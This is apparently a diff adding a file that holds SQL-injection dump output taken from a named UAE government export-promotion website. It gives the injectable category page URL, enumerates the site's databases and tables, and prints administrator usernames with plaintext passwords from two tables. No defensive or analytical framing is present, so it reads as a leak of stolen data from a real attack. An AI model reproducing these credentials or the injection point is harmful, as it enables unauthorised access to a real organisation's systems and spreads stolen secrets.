@@ -1,0 +1,67 @@
+.gov government
+
+.ae United Arab Emirates
+
+Sharjah Exports Development Center (SEDC)
+
+An İnitiative Of 
+
+Sharjah Chamber Of Commerce & Industry
+
+http://sharjahexports.gov.ae/en/category.php?cat=Home+%26+Garden
+
+available databases [3]:
+[+] information_schema
+[+] sharjahe_ramadan
+[+] sharjahe_sharjahexp
+
+Database: sharjahe_ramadan
+[3 tables]
++-----------------+
+| entries         |
+| ramadanfestuser |
+| winner          |
++-----------------+
+
+Database: sharjahe_sharjahexp
+[20 tables]
++-----------------------------+
+| user                        |
+| about                       |
+| analyticcountries           |
+| analytics                   |
+| block                       |
+| brand                       |
+| category                    |
+| company                     |
+| country                     |
+| countryinfo                 |
+| eventregister               |
+| hscodes                     |
+| hsheading                   |
+| hsheading2                  |
+| invitation                  |
+| news                        |
+| products                    |
+| searchquery                 |
+| subcategory                 |
+| tradeinvestmentregistration |
++-----------------------------+
+
+Database: sharjahe_ramadan
+Table: ramadanfestuser
+[1 entry]
++----------+-----------------+
+| festuser | festpass        |
++----------+-----------------+
+| admin    | adminsrf1086857 |
++----------+-----------------+
+
+Database: sharjahe_sharjahexp
+Table: user
+[1 entry]
++-----------+----------+-------------+
+| tablename | username | pwd         |
++-----------+----------+-------------+
+| company   | Admin    | admin123456 |
++-----------+----------+-------------+
